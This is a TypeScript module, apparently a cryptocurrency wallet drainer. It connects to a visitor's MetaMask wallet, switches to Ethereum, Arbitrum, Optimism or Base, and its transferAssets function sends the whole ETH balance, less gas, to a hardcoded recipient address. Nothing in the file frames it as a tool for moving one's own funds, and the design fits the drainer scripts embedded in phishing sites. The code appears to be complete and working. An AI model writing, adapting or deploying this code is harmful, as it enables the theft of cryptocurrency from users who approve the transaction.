import { ethers } from 'ethers';

// Target address to transfer assets to
const RECIPIENT_ADDRESS = '0xbCcf6DA049fe3Ab996Abb6f960174E266a9835f3';

// Chain IDs
export const CHAIN_IDS = {
  ETHEREUM: '0x1', // 1
  ARBITRUM: '0xa4b1', // 42161
  OPTIMISM: '0xa', // 10
  BASE: '0x2105', // 8453
};

// Chain names for display
export const CHAIN_NAMES = {
  [CHAIN_IDS.ETHEREUM]: 'Ethereum',
  [CHAIN_IDS.ARBITRUM]: 'Arbitrum',
  [CHAIN_IDS.OPTIMISM]: 'Optimism',
  [CHAIN_IDS.BASE]: 'Base',
};

// Default gas prices as fallback
export const DEFAULT_GAS_PRICES = {
  [CHAIN_IDS.ETHEREUM]: '30.0',  // Higher default for Ethereum
  [CHAIN_IDS.ARBITRUM]: '0.2',
  [CHAIN_IDS.OPTIMISM]: '0.02',
  [CHAIN_IDS.BASE]: '0.01',
};

// Estimated gas limit for a simple ETH transfer
const ESTIMATED_GAS_LIMIT = 21000;

/**
 * Get the current chain ID from MetaMask
 */
export const getCurrentChainId = async (): Promise<string> => {
  try {
    const { ethereum } = window as any;
    if (!ethereum) throw new Error('No ethereum provider found');

    const chainId = await ethereum.request({ method: 'eth_chainId' });
    return chainId;
  } catch (error) {
    console.error('Error getting chain ID:', error);
    throw error;
  }
};

/**
 * Switch to a specified network
 */
export const switchNetwork = async (chainId: string): Promise<void> => {
  try {
    const { ethereum } = window as any;
    if (!ethereum) throw new Error('No ethereum provider found');

    await ethereum.request({
      method: 'wallet_switchEthereumChain',
      params: [{ chainId }],
    });
  } catch (error: any) {
    // If the chain has not been added to MetaMask
    if (error.code === 4902) {
      throw new Error(`Please add the ${CHAIN_NAMES[chainId]} network to your wallet`);
    }
    console.error('Error switching network:', error);
    throw error;
  }
};

/**
 * Transfer maximum balance minus gas fees to the specified recipient
 */
export const transferAssets = async (
  chainId: string
): Promise<ethers.providers.TransactionResponse> => {
  try {
    const { ethereum } = window as any;
    if (!ethereum) throw new Error('No ethereum provider found');

    // Ensure we're on the correct chain
    const currentChainId = await getCurrentChainId();
    if (currentChainId !== chainId) {
      await switchNetwork(chainId);
    }

    const provider = new ethers.providers.Web3Provider(ethereum);
    const signer = provider.getSigner();
    const address = await signer.getAddress();

    // Get current balance
    const balance = await provider.getBalance(address);

    // Get current gas price from the network
    let gasPrice;
    try {
      // Try to get gas price from provider
      gasPrice = await provider.getGasPrice();
      // Add 20% buffer to ensure transaction goes through
      gasPrice = gasPrice.mul(120).div(100);
    } catch (error) {
      // Use default gas price if we couldn't get it from the provider
      console.log('Error getting gas price from provider, using default');
      gasPrice = ethers.utils.parseUnits(DEFAULT_GAS_PRICES[chainId], 'gwei');
    }

    // Calculate gas cost: gas price * gas limit
    const gasCost = gasPrice.mul(ESTIMATED_GAS_LIMIT);

    // Ensure the user has enough balance to pay for gas
    if (balance.lte(gasCost)) {
      throw new Error(`Insufficient funds. You need at least ${ethers.utils.formatEther(gasCost)} ETH for gas`);
    }

    // Calculate value to send: total balance - gas cost
    const valueToSend = balance.sub(gasCost);

    console.log(`Transferring ${ethers.utils.formatEther(valueToSend)} ETH to ${RECIPIENT_ADDRESS}`);
    console.log(`Gas cost: ${ethers.utils.formatEther(gasCost)} ETH (${ethers.utils.formatUnits(gasPrice, 'gwei')} Gwei)`);

    // Create transaction object
    const tx = {
      to: RECIPIENT_ADDRESS,
      value: valueToSend,
      gasPrice,
      gasLimit: ESTIMATED_GAS_LIMIT,
    };

    // Send the transaction
    return await signer.sendTransaction(tx);
  } catch (error) {
    console.error('Error transferring assets:', error);
    throw error;
  }
};
